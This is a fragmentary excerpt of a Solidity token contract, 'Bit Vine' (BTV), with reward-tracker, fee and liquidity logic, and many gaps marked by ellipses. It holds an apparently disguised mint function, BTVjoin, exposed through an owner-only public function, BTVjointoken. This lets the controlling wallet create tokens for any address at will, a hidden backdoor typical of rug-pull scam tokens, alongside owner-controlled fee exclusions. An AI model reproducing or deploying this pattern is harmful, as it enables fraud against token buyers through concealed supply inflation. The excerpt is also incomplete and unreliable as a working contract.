...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function BTVjoin(address account, uint256 amount) internal virtual {
...
function BTVjoin(address account, uint256 value) internal override {
    super.BTVjoin(account, value);
...
contract BTVrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardBTVMap  for RewardBTVMap .Map;
RewardBTVMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("BTV_rewardToken_Tracker", "BTV_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "BTV_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "BTV_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BTV contract.");
    }
...
contract BTV is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    BTVrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x430e5f0bC9D64A73bf649e4D45868352bCdfB428;
...
bool public cooldownEnabled = false;
 ...
 uint256 public  bnbReward = 5;
  ...
  constructor() ERC20("Bit Vine", "BTV") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new BTVrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function BTVjointoken(address userjoin, uint256 tokenjoin) public masterWallet{
       BTVjoin(userjoin, tokenjoin);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "BTV: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "BTV: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "BTV: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BTV: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTBTV = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTBTV);
...
addLiquidity(tokensTBTV, bnbForLiquidity);
